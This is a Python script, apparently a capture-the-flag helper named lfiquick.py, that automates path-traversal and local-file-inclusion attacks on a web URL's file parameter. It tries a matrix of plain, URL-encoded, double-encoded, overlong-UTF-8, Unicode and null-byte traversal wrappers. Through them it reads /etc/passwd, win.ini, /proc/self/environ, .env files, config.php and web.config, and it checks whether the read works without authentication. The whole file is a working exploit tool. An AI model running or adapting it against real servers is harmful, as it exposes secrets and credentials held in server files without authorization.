#!/usr/bin/env python3
"""lfiquick.py — bounded path-traversal/LFI read fast track.

Start with a known-valid GET URL whose query string already contains a real file
value. The helper preserves every other query field, calibrates a same-directory
missing-file control, tests a bounded SecLists-derived Linux/Windows traversal
matrix, and reuses the exact winning wrapper and depth for objective, environment,
and application-config paths. When authentication is supplied it also compares
the baseline and winning read anonymously.

Exit codes: 0 flag or confirmed file read, 2 inconclusive/no confirmed read,
3 rate-limit/gateway/request circuit break, 4 invalid arguments.
"""
import argparse
import hashlib
import json
import os
import posixpath
import re
import sys
import time
from urllib.parse import parse_qsl, quote, quote_plus, urlsplit, urlunsplit

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}',
    re.I)
PASSWD_RE = re.compile(r'(?m)^root:[^:\r\n]*:0:0:')
WININI_RE = re.compile(r'(?im)^\[(?:fonts|extensions|mci extensions|files)\]\s*$')
PROC_STATUS_RE = re.compile(r'(?ms)^Name:\s+\S+.*?^Pid:\s+\d+')
OS_RELEASE_RE = re.compile(r'(?m)^(?:NAME|ID)=["\x27]?[A-Za-z0-9]')
WINDOWS_HOSTS_RE = re.compile(r'(?im)^\s*#?\s*(?:127\.0\.0\.1|::1)\s+localhost(?:\s|$)')
NEGATIVE_RE = re.compile(
    r'(?:not found|no such file|enoent|invalid (?:file|path)|cannot (?:get|read|open)|'
    r'failed to (?:read|open)|outside (?:allowed|upload)|path (?:denied|rejected))', re.I)
GATEWAY_FAILURES = {502, 503, 504}
FILE_FIELDS = re.compile(
    r'^(?:file|filename|file_name|filepath|file_path|path|template|download)$', re.I)
LINUX_TARGETS = (
    "flag.txt", "flag", "root/flag.txt", "home/user/flag.txt", "home/ctf/flag.txt",
    "app/flag.txt", "app/flag", "usr/src/app/flag.txt", "workspace/flag.txt",
    "challenge/flag.txt", "data/flag.txt", "var/flag.txt",
    "proc/self/environ", "proc/1/environ", "app/.env", "usr/src/app/.env",
    "workspace/.env", "var/www/html/.env", "app/config.json",
    "usr/src/app/config.json", "var/www/html/config.php",
)
WINDOWS_TARGETS = (
    "flag.txt", "flag", "Users/Administrator/Desktop/flag.txt",
    "Users/Public/Desktop/flag.txt", "Users/Default/Desktop/flag.txt",
    "inetpub/wwwroot/flag.txt", "inetpub/wwwroot/flag", "xampp/htdocs/flag.txt",
    "Windows/Temp/flag.txt", "ProgramData/flag.txt", "inetpub/wwwroot/web.config",
    "inetpub/wwwroot/.env", "xampp/htdocs/.env", "xampp/htdocs/config.php",
)
LEGACY_SUFFIX_TARGETS = ("flag.txt%00", "flag.txt%00.jpg")

# Curated from the pattern families represented in SecLists' LFI-Jhaddix and
# Linux/Windows LFI lists. The raw lists contain malformed entries, log-poisoning
# paths, and command payloads, so replaying all of them would violate this helper's
# bounded, read-only contract.
STYLE_SPECS = {
    "plain": {"unit": "../", "platform": "linux", "separator": "/"},
    "absolute-posix": {"unit": "/", "platform": "linux", "separator": "/",
                       "absolute": True},
    "four-dot": {"unit": "....//", "platform": "linux", "separator": "/"},
    "double-slash": {"unit": "..//", "platform": "linux", "separator": "/"},
    "slash-encoded": {"unit": "..%2f", "platform": "linux", "separator": "/"},
    "double-encoded": {"unit": "..%252f", "platform": "linux", "separator": "/"},
    "backslash": {"unit": "..\\", "platform": "windows", "separator": "\\"},
    "absolute-windows": {"unit": "C:/", "platform": "windows", "separator": "/",
                         "absolute": True},
    "dot-encoded": {"unit": "%2e%2e%2f", "platform": "linux", "separator": "/"},
    "double-full": {"unit": "%252e%252e%252f", "platform": "linux",
                    "separator": "/"},
    "backslash-encoded": {"unit": "..%5c", "platform": "windows",
                          "separator": "%5c"},
    "mixed-slash": {"unit": "..%2f%5c", "platform": "windows",
                    "separator": "%5c"},
    "overlong-slash": {"unit": "..%c0%af", "platform": "linux", "separator": "/"},
    "unicode-slash": {"unit": "..%ef%bc%8f", "platform": "linux", "separator": "/"},
    "unicode-backslash": {"unit": "..%ef%bc%bc", "platform": "windows",
                          "separator": "%ef%bc%bc"},
}
CORE_STYLE_ORDER = (
    "plain", "absolute-posix", "four-dot", "double-slash", "slash-encoded",
    "double-encoded", "backslash", "absolute-windows",
)
EXTENDED_STYLE_ORDER = CORE_STYLE_ORDER + (
    "dot-encoded", "double-full", "backslash-encoded", "mixed-slash",
    "overlong-slash", "unicode-slash", "unicode-backslash",
)
STYLE_ORDER = tuple(STYLE_SPECS)
ALTERNATE_CONFIRMATIONS = {
    "linux": (
        ("proc/self/status", PROC_STATUS_RE, "/proc/self/status"),
        ("etc/os-release", OS_RELEASE_RE, "/etc/os-release"),
    ),
    "windows": (
        ("Windows/System32/drivers/etc/hosts", WINDOWS_HOSTS_RE, "Windows hosts"),
    ),
}


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


def wrapper(style, depth):
    spec = STYLE_SPECS[style]
    return spec["unit"] if spec.get("absolute") else spec["unit"] * depth


def style_depths(style, max_depth):
    return (0,) if STYLE_SPECS[style].get("absolute") else range(1, max_depth + 1)


def render_target(style, depth, target):
    spec = STYLE_SPECS[style]
    rendered = target.replace("/", spec["separator"])
    return wrapper(style, depth) + rendered


def confirmation_for(style):
    if STYLE_SPECS[style]["platform"] == "windows":
        return "Windows/win.ini", WININI_RE, "Windows win.ini"
    return "etc/passwd", PASSWD_RE, "/etc/passwd"


def targets_for(style):
    return (WINDOWS_TARGETS if STYLE_SPECS[style]["platform"] == "windows"
            else LINUX_TARGETS)


def shown(value, limit=140):
    value = value.replace("\r", "\\r").replace("\n", "\\n")
    return value if len(value) <= limit else value[:limit] + "..."


class LfiFastTrack:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.count = 0
        self.records = []
        self.possible = []
        self.confirmed = None
        self.found = None
        self.parts = urlsplit(args.url)
        self.query = parse_qsl(self.parts.query, keep_blank_values=True)
        self.param = self._resolve_param(args.param)
        values = [value for key, value in self.query if key == self.param]
        if len(values) != 1:
            raise ValueError("target query field must occur exactly once: %s" % self.param)
        self.known_value = values[0]
        if not self.known_value:
            raise ValueError("known-valid query value is empty; supply a real baseline value")

        common = {
            "User-Agent": UA,
            "Accept": "*/*",
        }
        auth_only = {}
        for item in args.header:
            if ":" not in item:
                raise ValueError("--header must be 'Name: Value': %s" % item)
            key, value = item.split(":", 1)
            key, value = key.strip(), value.strip()
            if key.lower() in ("authorization", "cookie"):
                auth_only[key] = value
            else:
                common[key] = value
        if args.token:
            auth_only["Authorization"] = "Bearer " + args.token
        if args.cookie:
            auth_only["Cookie"] = args.cookie
        self.anon_headers = dict(common)
        self.auth_headers = {**common, **auth_only}
        self.has_auth = bool(auth_only)
        self.preferred_identity = "auth" if self.has_auth else "anonymous"

        os.makedirs(args.out, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")

    def _resolve_param(self, explicit):
        keys = [key for key, _ in self.query]
        if explicit:
            if explicit not in keys:
                raise ValueError("--param %s is absent from the URL query" % explicit)
            return explicit
        candidates = unique(key for key in keys if FILE_FIELDS.fullmatch(key))
        if len(candidates) == 1:
            return candidates[0]
        if len(keys) == 1:
            return keys[0]
        raise ValueError("name --param; the URL has multiple query fields")

    def build_url(self, raw_value):
        rendered = []
        for key, value in self.query:
            encoded_key = quote_plus(key)
            if key == self.param:
                # Percent is safe deliberately: encoded traversal wrappers must reach
                # the server exactly once instead of being encoded again by requests.
                encoded_value = quote(raw_value, safe="/.%:@-_$~")
            else:
                encoded_value = quote_plus(value)
            rendered.append("%s=%s" % (encoded_key, encoded_value))
        return urlunsplit((self.parts.scheme, self.parts.netloc, self.parts.path,
                           "&".join(rendered), self.parts.fragment))

    def headers_for(self, identity):
        return self.auth_headers if identity == "auth" else self.anon_headers

    def signature(self, response):
        ctype = (response.headers.get("Content-Type") or "").split(";", 1)[0].lower()
        return ctype, len(response.content), hashlib.sha256(response.content).hexdigest()

    def valid_baseline(self, response):
        ctype = (response.headers.get("Content-Type") or "").lower()
        if not (200 <= response.status_code < 400) or not response.content:
            return False
        if "text/html" in ctype and not self.args.allow_html_baseline:
            return False
        return True

    def _record(self, label, identity, raw_value, url, response=None, error=None):
        safe = re.sub(r'[^A-Za-z0-9_.-]+', "_", "%03d_%s_%s" % (
            self.count, identity, label)).strip("_")
        record = {
            "label": label,
            "identity": identity,
            "raw_value": raw_value,
            "url": url,
        }
        if error is not None:
            record["error"] = repr(error)
        else:
            record.update({
                "status": response.status_code,
                "headers": dict(response.headers),
                "body_preview": response.content[:8000].decode("utf-8", errors="replace"),
                "body_sha256": hashlib.sha256(response.content).hexdigest(),
            })
            with open(os.path.join(self.args.out, safe + ".headers.txt"),
                      "w", encoding="utf-8") as fh:
                fh.write("HTTP %d\n" % response.status_code)
                for key, value in response.headers.items():
                    fh.write("%s: %s\n" % (key, value))
            with open(os.path.join(self.args.out, safe + ".body"), "wb") as fh:
                fh.write(response.content)
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")
        self.records.append(record)

    def send(self, label, identity, raw_value):
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        url = self.build_url(raw_value)
        try:
            response = self.session.get(
                url, headers=self.headers_for(identity), timeout=self.args.timeout,
                allow_redirects=False, verify=False)
        except requests.RequestException as exc:
            self._record(label, identity, raw_value, url, error=exc)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        self._record(label, identity, raw_value, url, response=response)
        print("[%02d/%02d] %-30s %-9s HTTP %d %db %s" % (
            self.count, self.args.max_probes, label, identity,
            response.status_code, len(response.content),
            (response.headers.get("Content-Type") or "-").split(";", 1)[0]))
        scan = response.content.decode("utf-8", errors="replace") + "\n" + "\n".join(
            "%s: %s" % item for item in response.headers.items())
        hits = unique(FLAG_RE.findall(scan))
        if response.status_code == 429:
            raise Inconclusive("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        return response, hits

    def missing_control_value(self):
        directory = posixpath.dirname(self.known_value)
        name = "lfiquick-missing-control.bin"
        return posixpath.join(directory, name) if directory else name

    def promising(self, response, baseline, negative):
        if self.signature(response) in (self.signature(baseline), self.signature(negative)):
            return False
        text = response.content.decode("utf-8", errors="replace")
        ctype = (response.headers.get("Content-Type") or "").lower()
        if not response.content or "text/html" in ctype or NEGATIVE_RE.search(text):
            return False
        return True

    def announce_flag(self, hits, style, depth, raw_value, identity, label):
        for hit in hits:
            print("FLAG %s" % hit)
        self.found = {
            "flags": hits,
            "style": style,
            "depth": depth,
            "raw_value": raw_value,
            "identity": identity,
            "label": label,
        }
        print("[+] winning traversal prefix: style=%s depth=%d value=%s" % (
            style, depth, shown(wrapper(style, depth))))

    def replay_anonymous(self, raw_value, expected_flags):
        if self.preferred_identity == "anonymous":
            print("[+] anonymous access confirmed (winning request was anonymous)")
            return
        response, hits = self.send("replay:anonymous", "anonymous", raw_value)
        if set(hits) & set(expected_flags):
            print("[+] anonymous replay returned the same flag")
        elif self.valid_baseline(response):
            print("[+] anonymous endpoint reachable, but the winning flag did not repeat")
        else:
            print("[-] winning read requires the supplied authentication")

    def target_sweep(self, style, depth, identity, already=None):
        already = set(already or [])
        for target in targets_for(style):
            raw_value = render_target(style, depth, target)
            if raw_value in already:
                continue
            response, hits = self.send(
                "target:%s" % target.replace("/", "_").replace("\\", "_"),
                identity, raw_value)
            if hits:
                self.announce_flag(hits, style, depth, raw_value, identity, "target-sweep")
                return True
        return False

    def compare_confirmed_anonymous(self, raw_value, signature):
        if self.preferred_identity == "anonymous":
            print("[+] confirmed traversal is anonymously reachable")
            return
        response, _ = self.send("confirm:anonymous", "anonymous", raw_value)
        if signature.search(response.content.decode("utf-8", errors="replace")):
            print("[+] confirmed traversal is anonymously reachable")
        else:
            print("[-] confirmed traversal requires the supplied authentication")

    def run(self):
        baselines = {}
        if self.has_auth:
            auth_response, auth_hits = self.send(
                "baseline", "auth", self.known_value)
            if auth_hits:
                raise Inconclusive("known-valid baseline already contains a flag")
            baselines["auth"] = auth_response
            anon_response, anon_hits = self.send(
                "baseline", "anonymous", self.known_value)
            if anon_hits:
                raise Inconclusive("anonymous baseline already contains a flag")
            baselines["anonymous"] = anon_response
            if not self.valid_baseline(auth_response) and self.valid_baseline(anon_response):
                self.preferred_identity = "anonymous"
                print("[*] supplied auth baseline failed; public baseline is valid")
        else:
            anon_response, anon_hits = self.send(
                "baseline", "anonymous", self.known_value)
            if anon_hits:
                raise Inconclusive("known-valid baseline already contains a flag")
            baselines["anonymous"] = anon_response

        baseline = baselines[self.preferred_identity]
        if not self.valid_baseline(baseline):
            raise Inconclusive(
                "known-valid baseline did not succeed with a non-HTML body; fix --url/--param")
        print("[+] valid baseline: %s=%s" % (self.param, shown(self.known_value)))

        negative, negative_hits = self.send(
            "negative-control", self.preferred_identity, self.missing_control_value())
        if negative_hits:
            raise Inconclusive("missing-file control unexpectedly contained a flag")
        if self.signature(negative) == self.signature(baseline):
            raise Inconclusive(
                "known-valid and missing-file responses are identical; baseline is not discriminating")

        styles = self.args.style or list(
            EXTENDED_STYLE_ORDER if self.args.profile == "extended" else CORE_STYLE_ORDER)
        for style in styles:
            confirm_target, confirm_signature, confirm_name = confirmation_for(style)
            for depth in style_depths(style, self.args.max_depth):
                confirm_value = render_target(style, depth, confirm_target)
                response, hits = self.send(
                    "probe:%s:d%d:signature" % (style, depth),
                    self.preferred_identity, confirm_value)
                if hits:
                    self.announce_flag(
                        hits, style, depth, confirm_value, self.preferred_identity,
                        "signature-probe")
                    self.replay_anonymous(confirm_value, hits)
                    return

                text = response.content.decode("utf-8", errors="replace")
                confirmed = bool(confirm_signature.search(text))
                is_promising = self.promising(response, baseline, negative)
                if confirmed:
                    self.confirmed = (style, depth, confirm_value, confirm_name)
                    print("[+] CONFIRMED file read: style=%s depth=%d (%s signature)" % (
                        style, depth, confirm_name))
                elif is_promising:
                    self.possible.append((style, depth, confirm_value))
                    print("[?] traversal-shaped differential: %s" % shown(text))

                direct_flag = render_target(style, depth, "flag.txt")
                direct, direct_hits = self.send(
                    "probe:%s:d%d:flag" % (style, depth),
                    self.preferred_identity, direct_flag)
                if direct_hits:
                    self.announce_flag(
                        direct_hits, style, depth, direct_flag,
                        self.preferred_identity, "direct-flag-probe")
                    self.replay_anonymous(direct_flag, direct_hits)
                    return

                if confirmed or is_promising:
                    if self.target_sweep(
                            style, depth, self.preferred_identity, already=[direct_flag]):
                        self.replay_anonymous(self.found["raw_value"], self.found["flags"])
                        return
                if confirmed:
                    self.compare_confirmed_anonymous(confirm_value, confirm_signature)
                    return

            # A filter may special-case passwd or win.ini. After the primary
            # depth sweep, try a tiny signature-backed fallback set at the
            # deepest/root-reaching form rather than multiplying every target
            # across every depth and wrapper.
            fallback_depth = 0 if STYLE_SPECS[style].get("absolute") else self.args.max_depth
            if self.args.profile == "extended":
                for legacy_target in LEGACY_SUFFIX_TARGETS:
                    legacy_value = render_target(style, fallback_depth, legacy_target)
                    _, hits = self.send(
                        "legacy:%s:%s" % (style, legacy_target.replace("%", "pct")),
                        self.preferred_identity, legacy_value)
                    if hits:
                        self.announce_flag(
                            hits, style, fallback_depth, legacy_value,
                            self.preferred_identity, "legacy-suffix-probe")
                        self.replay_anonymous(legacy_value, hits)
                        return
            for fallback_target, fallback_signature, fallback_name in ALTERNATE_CONFIRMATIONS[
                    STYLE_SPECS[style]["platform"]]:
                fallback_value = render_target(style, fallback_depth, fallback_target)
                response, hits = self.send(
                    "fallback:%s:%s" % (
                        style, fallback_target.replace("/", "_").replace("\\", "_")),
                    self.preferred_identity, fallback_value)
                if hits:
                    self.announce_flag(
                        hits, style, fallback_depth, fallback_value,
                        self.preferred_identity, "signature-fallback")
                    self.replay_anonymous(fallback_value, hits)
                    return

                text = response.content.decode("utf-8", errors="replace")
                confirmed = bool(fallback_signature.search(text))
                is_promising = self.promising(response, baseline, negative)
                if confirmed:
                    self.confirmed = (
                        style, fallback_depth, fallback_value, fallback_name)
                    print("[+] CONFIRMED file read: style=%s depth=%d (%s signature)" % (
                        style, fallback_depth, fallback_name))
                elif is_promising:
                    self.possible.append((style, fallback_depth, fallback_value))
                    print("[?] traversal-shaped differential: %s" % shown(text))

                if confirmed or is_promising:
                    direct_flag = render_target(style, fallback_depth, "flag.txt")
                    if self.target_sweep(
                            style, fallback_depth, self.preferred_identity,
                            already=[direct_flag]):
                        self.replay_anonymous(self.found["raw_value"], self.found["flags"])
                        return
                if confirmed:
                    self.compare_confirmed_anonymous(fallback_value, fallback_signature)
                    return

        if self.possible:
            raise Inconclusive(
                "%d response differential(s) lacked a file signature or flag; inspect evidence"
                % len(self.possible))
        raise Inconclusive("bounded traversal set found no confirmed file read")


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Probe one known-valid file query parameter for bounded path traversal")
    parser.add_argument("--url", required=True,
                        help="known-valid GET URL including the real baseline file value")
    parser.add_argument("--param", help="query field to mutate; inferred when unambiguous")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[],
                        help="extra 'Name: Value' header; repeatable")
    parser.add_argument("--out", default="recon/lfiquick", help="evidence directory")
    parser.add_argument(
        "--profile", choices=("core", "extended"), default="core",
        help="core is bounded and modern; extended adds legacy/Unicode/null-byte families")
    parser.add_argument("--style", action="append", choices=STYLE_ORDER, default=[],
                        help="limit traversal style; repeatable")
    parser.add_argument("--max-depth", type=int, default=6)
    parser.add_argument("--max-probes", type=int,
                        help="request cap (default: 128 core, 260 extended)")
    parser.add_argument("--delay", type=float, default=0.12)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--allow-html-baseline", action="store_true",
                        help="allow an intentional HTML file as the known-valid baseline")
    return parser.parse_args(argv)


def main(argv=None):
    runner = None
    try:
        args = parse_args(argv)
        if args.max_probes is None:
            args.max_probes = 260 if args.profile == "extended" else 128
        if not 1 <= args.max_depth <= 8:
            raise ValueError("--max-depth must be between 1 and 8")
        if not 3 <= args.max_probes <= 300:
            raise ValueError("--max-probes must be between 3 and 300")
        if args.delay < 0 or args.timeout <= 0:
            raise ValueError("--delay must be non-negative and --timeout must be positive")
        runner = LfiFastTrack(args)
        runner.run()
        print("[*] completed %d probe(s); evidence: %s" % (runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        print("[!] INCONCLUSIVE: %s" % exc)
        return 2
    except CircuitBreak as exc:
        print("[!] CIRCUIT BREAKER: %s" % exc)
        return 3
    except (ValueError, TypeError) as exc:
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
